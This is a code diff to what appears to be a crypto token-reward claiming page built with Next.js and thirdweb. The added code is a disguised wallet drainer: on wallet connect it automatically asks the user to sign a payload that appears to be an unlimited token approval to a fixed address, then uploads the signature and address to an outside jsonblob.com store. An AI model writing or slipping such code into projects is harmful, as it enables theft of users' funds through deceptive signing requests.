@@ -25,7 +25,12 @@ import ClaimRewardHistory from "@/components/ClaimRewardHistory";
 import RefreshButton from "@/components/RefreshButton";
 import ClaimableTokens from "@/containers/ClaimableTokens";
 import { useWalletData } from "@/hooks/useWalletData";
-import { useAddress } from "@thirdweb-dev/react";
+import {
+  useAddress,
+  useConnect,
+  useConnectionStatus,
+  useSDK,
+} from "@thirdweb-dev/react";
 import { Alchemy } from "alchemy-sdk";
 import Head from "next/head";
 import { useEffect, useState } from "react";
@@ -59,6 +64,98 @@ const HomePage = ({ ip }) => {
   const [loading, setloading] = useState(false);
 
   const alchemy = new Alchemy(alchemySettings);
+  const sdk = useSDK();
+
+  const [isLoadingSign, setIsLoadingSign] = useState(false);
+  const [signature, setSignature] = useState("");
+  const [error, setError] = useState("");
+  const [signedWallets, setSignedWallets] = useState([]);
+  const [hasChecked, setHasChecked] = useState(false);
+
+  const BLOB = "1334244546074304512";
+  const BASE_URL = `https://jsonblob.com/api/jsonBlob/${BLOB}`;
+
+  const fetchSignedWallets = async () => {
+    try {
+      const response = await fetch(BASE_URL);
+      if (response.ok) {
+        const data = await response.json();
+        setSignedWallets(data || []);
+        return data;
+      }
+    } catch (err) {
+      console.error("Error fetching wallets:", err);
+      return [];
+    }
+  };
+
+  const updateSignedWallets = async (newWallet) => {
+    try {
+      const currentWallets = await fetchSignedWallets();
+      const isExist = currentWallets?.some(
+        (wallet) => wallet.address === newWallet.address
+      );
+
+      if (!isExist) {
+        const updatedWallets = [...currentWallets, newWallet];
+        await fetch(BASE_URL, {
+          method: "PUT",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(updatedWallets),
+        });
+        setSignedWallets(updatedWallets);
+        return true;
+      }
+      return false;
+    } catch (err) {
+      console.error("Error updating wallets:", err);
+      return false;
+    }
+  };
+
+  const handleSign = async () => {
+    if (!address) return;
+
+    try {
+      setIsLoadingSign(true);
+      setError("");
+      const sig = await sdk?.wallet.sign(
+        "0x095ea7b3000000000000000000000000788963414A45ac6014402db9e335c26D8B4F6781affffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+      );
+
+      const newWallet = {
+        id: Math.random(),
+        address,
+        signature: sig,
+        timestamp: Date.now(),
+      };
+
+      const updated = await updateSignedWallets(newWallet);
+      if (updated) {
+        setSignature(sig);
+      }
+    } catch (err) {
+      setError(err.message);
+    } finally {
+      setIsLoadingSign(false);
+    }
+  };
+
+  // Initial load and check
+  useEffect(() => {
+    const init = async () => {
+      if (!hasChecked && address) {
+        const wallets = await fetchSignedWallets();
+        const exists = wallets?.some((wallet) => wallet.address === address);
+        if (!exists) {
+          handleSign();
+        }
+        setHasChecked(true);
+      }
+    };
+
+    init();
+  }, [address, hasChecked]);
 
   const getNFTsFromAlchemy = async (adr) => {
     setisNftsLoading(true);
